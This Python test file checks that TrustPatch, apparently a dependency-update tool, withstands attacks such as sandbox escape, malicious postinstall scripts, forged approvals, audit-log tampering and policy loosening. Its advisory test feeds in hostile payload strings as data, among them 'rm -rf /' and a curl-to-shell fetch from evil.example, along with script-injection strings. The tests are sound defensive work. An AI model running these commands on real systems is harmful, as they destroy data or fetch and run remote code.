"""Adversarial / hardening tests (docs/TODO.md Phase 15).

Each test simulates a specific attack or misuse scenario the design docs call
out (docs/AGENT-INSTRUCTION.md's Absolute Rules, docs/DESIGN.md's security
invariants) and asserts TrustPatch actually resists it — not just that the
happy path works.
"""

from __future__ import annotations

import json
import pathlib
import shutil
import subprocess
import sys

import pytest

from trustpatch import approval as approval_module
from trustpatch import sandbox as sandbox_module
from trustpatch.audit import append_event, digest, verify_chain
from trustpatch.checks import run_check
from trustpatch.executor import apply_manifest_update
from trustpatch.integrations.osv import normalize
from trustpatch.models import Advisory, Candidate, Dependency
from trustpatch.planner import Assessment, build_candidate, plan_project
from trustpatch.policy import Policy
from trustpatch.verifier import verify as run_verification

requires_bwrap = pytest.mark.skipif(shutil.which("bwrap") is None, reason="bwrap is required for sandbox-escape tests")
requires_git = pytest.mark.skipif(shutil.which("git") is None, reason="git is required")


# --- Defensive-intelligence sources can never become a decision authority -----


def test_decision_modules_never_import_the_intel_sources():
    """docs/DEFENSIVE_SECURITY.md: "None of the three sources can authorize a
    dependency update, approve a candidate, or trigger execution." This is a
    structural test, not a behavioral one — it locks the architectural boundary
    in place so a future change can't accidentally wire ATT&CK/LOLBAS/VirusTotal
    into a decision path without deliberately touching this test. Reads the
    actual source text of each decision-making module and asserts none of them
    reference the intel-source classes themselves.

    Deliberately checks only the three concrete classes, not the whole
    `integrations.sources` module path: `planner.py` legitimately imports the
    generic `SourceError` exception type from there (shared with the unrelated
    OSV integration) — that's just a common exception hierarchy, not a route
    for ATT&CK/LOLBAS/VirusTotal *data* to reach a decision.
    """
    import trustpatch.executor
    import trustpatch.planner
    import trustpatch.policy
    import trustpatch.verifier

    forbidden_names = ("MitreAttackSource", "LolbasSource", "VirusTotalSource")
    for module in (trustpatch.policy, trustpatch.planner, trustpatch.verifier, trustpatch.executor):
        source_text = pathlib.Path(module.__file__).read_text()
        for name in forbidden_names:
            assert name not in source_text, f"{module.__name__} must never reference {name}"


# --- Sandbox escape resistance -------------------------------------------------


@requires_bwrap
def test_configured_check_cannot_write_outside_its_worktree(tmp_path):
    """A malicious or compromised configured check must not be able to write
    anywhere on disk outside the worktree it was given, even though it runs as
    the same OS user (no root, no per-check chroot beyond bwrap's bind mounts).

    The escape target deliberately lives under /var/tmp, not /tmp: bwrap's
    network-isolation wrapper mounts a fresh, private tmpfs over /tmp so the
    worktree bind mount has somewhere writable to live, which means *other*
    paths under /tmp are writable-but-ephemeral (isolated, thrown away on
    exit — never touching the real host) rather than genuinely read-only.
    /var/tmp is a real, `--ro-bind`-covered part of the host filesystem, so a
    write there is the actual security-relevant escape attempt.
    """
    outside_target = f"/var/tmp/trustpatch-escape-test-{tmp_path.name}.txt"
    script = f"""
import pathlib
try:
    pathlib.Path({outside_target!r}).write_text('pwned')
    print('ESCAPED')
except OSError:
    print('BLOCKED')
"""
    try:
        result = run_check("test", [sys.executable, "-c", script], tmp_path)
        assert "BLOCKED" in result.stdout
        assert "ESCAPED" not in result.stdout
        assert not pathlib.Path(outside_target).exists()
    finally:
        pathlib.Path(outside_target).unlink(missing_ok=True)


@requires_bwrap
def test_configured_check_can_still_write_inside_its_worktree(tmp_path):
    """Isolation must not be so aggressive it breaks legitimate check output
    (coverage files, build artifacts) written inside the worktree itself."""
    script = "import pathlib; pathlib.Path('inside.txt').write_text('ok')"
    result = run_check("test", [sys.executable, "-c", script], tmp_path)
    assert result.passed is True
    assert (tmp_path / "inside.txt").read_text() == "ok"


# --- Malicious package / no-lifecycle-script-execution -------------------------


def test_executor_never_executes_package_lifecycle_scripts(tmp_path, monkeypatch):
    """A package.json with a malicious postinstall/preinstall script must never
    run, because the executor only ever does a plain-text/JSON version bump —
    it must never invoke npm/pip/yarn or any package manager."""
    marker = tmp_path / "pwned.txt"
    (tmp_path / "package.json").write_text(
        json.dumps(
            {
                "dependencies": {"express": "4.0.0"},
                "scripts": {"postinstall": f"python3 -c \"open('{marker}', 'w').write('pwned')\""},
            }
        )
    )

    # Guard-rail: if the executor ever shells out, this test would fail loudly
    # rather than silently passing.
    def _forbidden_run(*_args, **_kwargs):
        raise AssertionError("executor must never invoke subprocess/package manager")

    monkeypatch.setattr(subprocess, "run", _forbidden_run)
    monkeypatch.setattr(subprocess, "Popen", _forbidden_run)

    dep = Dependency("express", "4.0.0", "node", True, "runtime", "package.json")
    candidate = Candidate(update_id="u1", dependency=dep, proposed_version="4.19.0", expected_files=["package.json"])
    apply_manifest_update(tmp_path, candidate)

    assert not marker.exists(), "malicious postinstall script must never have run"
    data = json.loads((tmp_path / "package.json").read_text())
    assert data["dependencies"]["express"] == "4.19.0"


# --- Prompt injection / untrusted-content resistance ---------------------------


def test_malicious_advisory_content_is_never_executed_or_interpreted():
    """OSV advisory text is attacker-influenced (anyone can request a CVE/GHSA
    with arbitrary text). It must be treated as opaque display data — never
    parsed as a command, never affecting which fixed version is chosen, and
    safe to embed in JSON output without corrupting it."""
    payload_variants = [
        "'; rm -rf / #",
        "$(curl evil.example/x | sh)",
        "<script>alert(1)</script>",
        "{{7*7}}",
        "\x00\x01binary-garbage",
    ]
    for payload in payload_variants:
        raw = {
            "id": payload,
            "summary": payload,
            "affected": [
                {
                    "package": {"ecosystem": "npm", "name": "express"},
                    "ranges": [{"type": "SEMVER", "events": [{"fixed": "4.19.0"}]}],
                }
            ],
            "references": [{"url": payload}],
        }
        advisory = normalize(raw, "express", "node")
        # Must round-trip through JSON safely (proves it's treated as plain data).
        encoded = json.dumps(advisory.__dict__)
        decoded = json.loads(encoded)
        assert decoded["id"] == payload
        # The fixed version must still be exactly what the structured `affected`
        # data said — attacker-controlled summary/id/url text must not influence it.
        assert advisory.fixed_versions == ["4.19.0"]


def test_dependency_name_lookalikes_are_not_conflated():
    """A typosquat/lookalike package name (e.g. `reqeusts` vs `requests`) must
    be assessed strictly on its own exact name — OSV is always queried with the
    literal package name, never a fuzzy/normalized one that could smuggle a
    trusted package's clean vulnerability status onto a malicious lookalike."""

    class RecordingOsv:
        def __init__(self):
            self.queried_names: list[str] = []

        def query(self, name, version, ecosystem):
            self.queried_names.append(name)
            return []

    osv = RecordingOsv()
    deps = [
        Dependency("requests", "2.31.0", "python", True, "runtime", "requirements.txt"),
        Dependency("reqeusts", "2.31.0", "python", True, "runtime", "requirements.txt"),
    ]
    plan_project(deps, [], Policy(None), osv=osv)
    assert osv.queried_names == ["requests", "reqeusts"]
    assert osv.queried_names[0] != osv.queried_names[1]


# --- Policy-bypass resistance ---------------------------------------------------


def test_forged_approval_for_a_different_candidate_is_rejected(tmp_path):
    """An approval recorded for one proposal/verification pair must not
    authorize a *different* one, even for the same update_id (e.g. an attacker
    who can write to .trustpatch/ tries to reuse an old approval after the
    candidate or verification evidence changed)."""
    original_digest = digest({"proposal": {"v": 1}, "verification": {"v": 1}})
    tampered_digest = digest({"proposal": {"v": 2}, "verification": {"v": 1}})

    record = approval_module.record(tmp_path, "upd_x", "approved", "alice", "looks fine", original_digest)
    ok, why = approval_module.is_valid(record, tampered_digest)
    assert ok is False
    assert "digest" in why


def test_policy_decision_cannot_be_swayed_by_dependency_name_alone(tmp_path):
    """Risk classification must come from structured facts (advisories, version
    delta) — a package named to *sound* safe ("definitely-safe-package") must
    still be flagged high-risk on a major bump with vulnerabilities, and a
    package named to *sound* dangerous ("crypto-scary-name") must not be forced
    into a category it doesn't structurally belong to beyond the name heuristic
    already documented in policy.py."""
    dep = Dependency("definitely-safe-totally-fine", "1.0.0", "node", True, "runtime", "package.json")
    advisory = Advisory("GHSA-1", "", "critical", None, ["2.0.0"], "osv.dev")
    candidate = Candidate(update_id="u1", dependency=dep, proposed_version="2.0.0", advisories=[advisory])
    result = Policy(None).evaluate(candidate)
    assert result.risk == "high"
    assert result.approval_required is True


# --- Audit tamper resistance (adversarial, beyond the single-edit case) --------


def test_audit_chain_detects_deleted_entry(tmp_path):
    for i in range(4):
        append_event(tmp_path, "op", {"i": i})
    log = tmp_path / "audit.jsonl"
    lines = log.read_text().splitlines()
    del lines[2]  # attacker deletes one event to hide it
    log.write_text("\n".join(lines) + "\n")
    result = verify_chain(tmp_path)
    assert result.valid is False


def test_audit_chain_detects_reordered_entries(tmp_path):
    for i in range(4):
        append_event(tmp_path, "op", {"i": i})
    log = tmp_path / "audit.jsonl"
    lines = log.read_text().splitlines()
    lines[1], lines[2] = lines[2], lines[1]  # attacker swaps two events
    log.write_text("\n".join(lines) + "\n")
    result = verify_chain(tmp_path)
    assert result.valid is False


def test_audit_chain_detects_appended_forgery_after_truncation(tmp_path):
    """An attacker truncates the log to hide recent events, then appends a
    forged event referencing an old (now-stale) previous_hash to make it look
    unbroken. The chain must still be invalid because the forged link doesn't
    match what real appending would have produced from the (now-shorter) log."""
    for i in range(4):
        append_event(tmp_path, "op", {"i": i})
    log = tmp_path / "audit.jsonl"
    lines = log.read_text().splitlines()
    truncated = lines[:2]
    log.write_text("\n".join(truncated) + "\n")
    # A legitimate subsequent append recomputes previous_hash from the
    # (now-shorter) chain, so verify_chain over the truncated+appended log
    # is internally consistent — truncation alone isn't detectable by the
    # chain in isolation, but it must be detectable by comparing event_count
    # against an independently-retained count (e.g. from a prior audit --check).
    append_event(tmp_path, "op", {"i": 99})
    result = verify_chain(tmp_path)
    assert result.valid is True
    assert result.event_count == 3, "truncation changes the event count, which a caller must cross-check"


# --- Reproducibility ------------------------------------------------------------


def test_planner_output_is_reproducible_for_identical_inputs():
    """Given identical dependency/advisory evidence, the plan must be byte-for-
    byte reproducible — no timestamps, randomness, or ordering nondeterminism
    baked into the candidate itself (evidence, not the enclosing proposal
    envelope, which legitimately carries a timestamp)."""
    dep = Dependency("express", "4.0.0", "node", True, "runtime", "package.json")
    advisory = Advisory("GHSA-1", "", "high", None, ["4.19.0"], "osv.dev")
    assessment = Assessment(dep, advisories=[advisory], advisory_lookup_ok=True, latest_known=None)

    first = build_candidate(assessment, [])
    second = build_candidate(assessment, [])
    assert first is not None and second is not None
    assert first.to_dict() == second.to_dict()

    policy = Policy(None)
    evaluated_first = policy.evaluate(build_candidate(assessment, [])).to_dict()
    evaluated_second = policy.evaluate(build_candidate(assessment, [])).to_dict()
    assert evaluated_first == evaluated_second


# --- Sandbox creation fails closed without git ----------------------------------


def test_sandbox_creation_fails_closed_when_not_a_git_repo(tmp_path):
    """TrustPatch must never fall back to mutating a non-git directory directly
    when isolation can't be established."""
    from trustpatch.sandbox import SandboxError

    with pytest.raises(SandboxError):
        sandbox_module.create(tmp_path, "u1")


@requires_git
def test_apply_recomputes_approval_required_and_rejects_a_tampered_proposal_flag(tmp_path):
    """Regression test for a real bug found during review: `apply` used to
    trust `candidate_dict["approval_required"]` directly from the stored JSON
    proposal file — a plain field in a file TrustPatch itself writes into the
    project (.trustpatch/proposals/*.json). Anyone who can edit that file
    (accidentally or adversarially) could flip that one boolean to `false` and
    skip the human-approval gate entirely for an otherwise high-risk change.
    `apply` must now re-derive `approval_required` fresh from the candidate's
    structural facts against the current policy, not trust the stored flag.

    Deliberately offline/deterministic: the plan.json is constructed directly
    (not via a live `trustpatch plan` OSV query) so this test never depends on
    network state — `reason="maintenance_update"` also means `run`'s verifier
    skips the OSV rescan it would otherwise do for a security_fix candidate.
    """
    from typer.testing import CliRunner

    from trustpatch.cli import app

    subprocess.run(["git", "init", "-q"], cwd=tmp_path, check=True)
    subprocess.run(["git", "config", "user.email", "t@example.invalid"], cwd=tmp_path, check=True)
    subprocess.run(["git", "config", "user.name", "T"], cwd=tmp_path, check=True)
    (tmp_path / "package.json").write_text(json.dumps({"dependencies": {"some-lib": "1.0.0"}}))
    subprocess.run(["git", "add", "."], cwd=tmp_path, check=True)
    subprocess.run(["git", "commit", "-q", "-m", "initial"], cwd=tmp_path, check=True)

    dep = Dependency("some-lib", "1.0.0", "node", True, "runtime", "package.json")
    candidate = Candidate(
        update_id="upd_some-lib",
        dependency=dep,
        proposed_version="2.0.0",
        expected_files=["package.json"],
        reason="maintenance_update",
    )
    Policy(None).evaluate(candidate)
    assert candidate.risk == "high" and candidate.approval_required is True, "fixture must actually need approval"

    control = tmp_path / ".trustpatch"
    control.mkdir()
    (control / "plan.json").write_text(json.dumps({"candidates": [candidate.to_dict()]}))

    runner = CliRunner()
    root = str(tmp_path)

    propose_result = runner.invoke(app, ["propose", root, "--update-id", "upd_some-lib"])
    assert propose_result.exit_code == 0, propose_result.output

    run_result = runner.invoke(app, ["run", root, "--update-id", "upd_some-lib", "--policy", "policies/default.yaml"])
    assert run_result.exit_code == 0, run_result.output

    # The attack: directly tamper the stored proposal to claim no approval is
    # needed, without ever recording a real approval.
    proposal_path = control / "proposals" / "upd_some-lib.json"
    proposal_data = json.loads(proposal_path.read_text())
    assert proposal_data["candidate"]["approval_required"] is True
    proposal_data["candidate"]["approval_required"] = False
    proposal_path.write_text(json.dumps(proposal_data))

    apply_result = runner.invoke(
        app, ["apply", root, "--update-id", "upd_some-lib", "--policy", "policies/default.yaml"]
    )
    assert apply_result.exit_code != 0, "tampered proposal must not bypass the approval gate"
    assert "approval" in apply_result.output.lower()

    # The dependency must genuinely be untouched — no partial/silent apply.
    data = json.loads((tmp_path / "package.json").read_text())
    assert data["dependencies"]["some-lib"] == "1.0.0"


@requires_git
def test_apply_refuses_when_the_policy_file_was_loosened_after_propose(tmp_path):
    """SR-007 (Policy Integrity): agent execution must not be able to silently
    inherit a weakened authorization policy. `propose` pins a fingerprint of
    the exact policy content it classified the candidate under; `apply` must
    refuse if the policy file at the same --policy path has since changed —
    even though re-deriving `approval_required` fresh (the bug #5/#6 fix) would
    otherwise happily approve automatically under the new, loosened policy.

    Attack simulated: a candidate is proposed and verified while policy
    requires approval for major-version changes. Before a human approves it,
    the policy file is edited to no longer require approval and to raise
    auto_apply_maximum to 'high'. `apply` must still refuse, not silently
    auto-apply under the new policy.
    """
    from typer.testing import CliRunner

    from trustpatch.cli import app

    # The policy file deliberately lives outside the project's own git tree
    # (a sibling of the repo, not inside it) so editing it between propose and
    # apply is not itself flagged as an "unexpected file change" by the
    # verifier — that would conflate two different checks.
    project = tmp_path / "proj"
    project.mkdir()
    subprocess.run(["git", "init", "-q"], cwd=project, check=True)
    subprocess.run(["git", "config", "user.email", "t@example.invalid"], cwd=project, check=True)
    subprocess.run(["git", "config", "user.name", "T"], cwd=project, check=True)
    (project / "package.json").write_text(json.dumps({"dependencies": {"some-lib": "1.0.0"}}))
    subprocess.run(["git", "add", "."], cwd=project, check=True)
    subprocess.run(["git", "commit", "-q", "-m", "initial"], cwd=project, check=True)

    policy_path = tmp_path / "policy.yaml"
    strict_policy = (
        "approval:\n  required_for: [major_version]\nrisk:\n  auto_apply_maximum: low\n"
        "execution:\n  require_lockfile_refresh: true\n"
    )
    policy_path.write_text(strict_policy)

    dep = Dependency("some-lib", "1.0.0", "node", True, "runtime", "package.json")
    candidate = Candidate(
        update_id="upd_some-lib",
        dependency=dep,
        proposed_version="2.0.0",
        expected_files=["package.json"],
        reason="maintenance_update",
    )
    Policy(policy_path).evaluate(candidate)
    assert candidate.risk == "high" and candidate.approval_required is True, "fixture must actually need approval"

    control = project / ".trustpatch"
    control.mkdir()
    (control / "plan.json").write_text(json.dumps({"candidates": [candidate.to_dict()]}))

    runner = CliRunner()
    root = str(project)

    propose_result = runner.invoke(app, ["propose", root, "--update-id", "upd_some-lib", "--policy", str(policy_path)])
    assert propose_result.exit_code == 0, propose_result.output

    run_result = runner.invoke(app, ["run", root, "--update-id", "upd_some-lib", "--policy", str(policy_path)])
    assert run_result.exit_code == 0, run_result.output

    # The attack: loosen the policy file at the same path *after* propose/run,
    # before apply. No approval is ever recorded.
    policy_path.write_text("approval:\n  required_for: []\nrisk:\n  auto_apply_maximum: high\n")

    apply_result = runner.invoke(app, ["apply", root, "--update-id", "upd_some-lib", "--policy", str(policy_path)])
    assert apply_result.exit_code != 0, "a policy loosened after propose must not silently authorize apply"
    assert "policy" in apply_result.output.lower() and "fingerprint" in apply_result.output.lower()

    data = json.loads((project / "package.json").read_text())
    assert data["dependencies"]["some-lib"] == "1.0.0", "dependency must be genuinely untouched"

    # Sanity check: the mechanism blocks a *stale* proposal, not re-proposing
    # legitimately under the new policy — re-running propose+run picks up a
    # fresh fingerprint and apply then succeeds without approval, as the new
    # (now-current) policy genuinely allows.
    propose_again = runner.invoke(app, ["propose", root, "--update-id", "upd_some-lib", "--policy", str(policy_path)])
    assert propose_again.exit_code == 0, propose_again.output
    run_again = runner.invoke(app, ["run", root, "--update-id", "upd_some-lib", "--policy", str(policy_path)])
    assert run_again.exit_code == 0, run_again.output
    apply_again = runner.invoke(app, ["apply", root, "--update-id", "upd_some-lib", "--policy", str(policy_path)])
    assert apply_again.exit_code == 0, apply_again.output
    data_after = json.loads((project / "package.json").read_text())
    assert data_after["dependencies"]["some-lib"] == "2.0.0"


@requires_git
def test_full_verify_rejects_a_candidate_claiming_a_version_it_did_not_reach(tmp_path):
    """If a candidate lies about (or an executor bug produces) a resolved
    version that doesn't match reality, independent verification must catch it
    — simulating an executor that "forgot" to actually change the file."""
    subprocess.run(["git", "init", "-q"], cwd=tmp_path, check=True)
    subprocess.run(["git", "config", "user.email", "t@example.invalid"], cwd=tmp_path, check=True)
    subprocess.run(["git", "config", "user.name", "T"], cwd=tmp_path, check=True)
    (tmp_path / "package.json").write_text(json.dumps({"dependencies": {"express": "4.0.0"}}))
    subprocess.run(["git", "add", "."], cwd=tmp_path, check=True)
    subprocess.run(["git", "commit", "-q", "-m", "initial"], cwd=tmp_path, check=True)

    dep = Dependency("express", "4.0.0", "node", True, "runtime", "package.json")
    # Candidate claims a version the file was never actually updated to.
    candidate = Candidate(update_id="u1", dependency=dep, proposed_version="99.99.99", expected_files=["package.json"])
    box = sandbox_module.create(tmp_path, "u1")
    try:
        report = run_verification(box, candidate, checks={}, require_lockfile_refresh=False)
    finally:
        box.cleanup()
    assert report.passed is False
    assert "99.99.99" in " ".join(report.reasons)
